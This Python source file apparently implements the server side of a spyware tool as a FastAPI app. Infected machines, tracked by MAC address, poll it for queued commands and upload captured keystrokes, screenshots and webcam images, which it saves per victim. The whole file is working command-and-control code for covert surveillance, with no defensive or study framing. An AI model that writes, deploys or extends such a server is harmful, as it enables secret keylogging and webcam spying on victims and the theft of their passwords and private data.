import uvicorn
import json
import os
from fastapi import FastAPI, Request
from typing import Dict, List

app = FastAPI()
ROOT_DIR = os.getcwd()
DB_NAME = 'db.json'


@app.get('/first_command')
async def first_command(request: Request) -> Dict[str, List[str]]:
    db = load_db()
    mac = request.headers['MAC-Address']
    date_time = request.headers['Date']
    if db.get(mac, None) is None:
        initialize_new_client(mac, date_time, db)
        return {'commands': ['no_commands']}
    else:
        db[mac]['last_datetime'] = date_time
        write_db(db)
        return get_commands(mac_address=mac, db=db)


@app.get('/command')
async def command(request: Request) -> Dict[str, List[str]]:
    db = load_db()
    date_time = request.headers['Date']
    mac = request.headers['MAC-Address']
    db[mac]['last_datetime'] = date_time
    write_db(db)
    return get_commands(mac_address=mac, db=db)


@app.post('/keylog_data')
async def keylog(request: Request) -> None:
    data = await request.body()
    data = data.replace(b'\x00', b'')
    db = load_db()
    mac = request.headers['MAC-Address']
    with open(f'{ROOT_DIR}/{mac}/log{db[mac]["keylogs_received"]}.txt', 'wb') as f:
        f.write(data)
    db[mac]['keylogs_received'] += 1
    write_db(db)


@app.post('/screenshot')
async def screenshot(request: Request) -> None:
    await save_image(request, 'screenshot', 'screenshots_taken')


@app.post('/webcam_capture')
async def webcam_capture(request: Request) -> None:
    await save_image(request, 'webcam', 'webcam_shots_taken')


async def save_image(request: Request, filename: str, db_identifier: str) -> None:
    data = await request.body()
    mac = request.headers['MAC-Address']
    db = load_db()
    image_type = request.headers['Content-Type'].split('/')[1]
    with open(f'{ROOT_DIR}/{mac}/{filename}{db[mac][db_identifier]}.{image_type}', 'wb') as f:
        f.write(data)
    db[mac][db_identifier] += 1
    write_db(db)


def load_db() -> dict:
    with open(DB_NAME, 'r') as file:
        db = json.loads(file.read())
    return db


def write_db(db: dict) -> None:
    with open(DB_NAME, 'w') as file:
        file.write(json.dumps(db))


def initialize_new_client(mac_address: str, datetime: str, db: dict) -> None:
    db[mac_address] = {
        'commands': [],
        'dir': f'{ROOT_DIR}\\{mac_address}',
        'last_datetime': datetime,
        'screenshots_taken': 0,
        'webcam_shots_taken': 0,
        'keylogs_received': 0
    }
    os.mkdir(f'{ROOT_DIR}\\{mac_address}')
    write_db(db)


def get_commands(mac_address: str, db: dict) -> Dict[str, List[str]]:
    commands = db[mac_address]['commands']
    if not commands:
        return {'commands': ['no_commands']}
    else:
        db[mac_address]['commands'] = []
        write_db(db)
        return {'commands': commands}


if __name__ == '__main__':
    uvicorn.run(app, host='0.0.0.0', port=30050)
# uvicorn main:app --reload
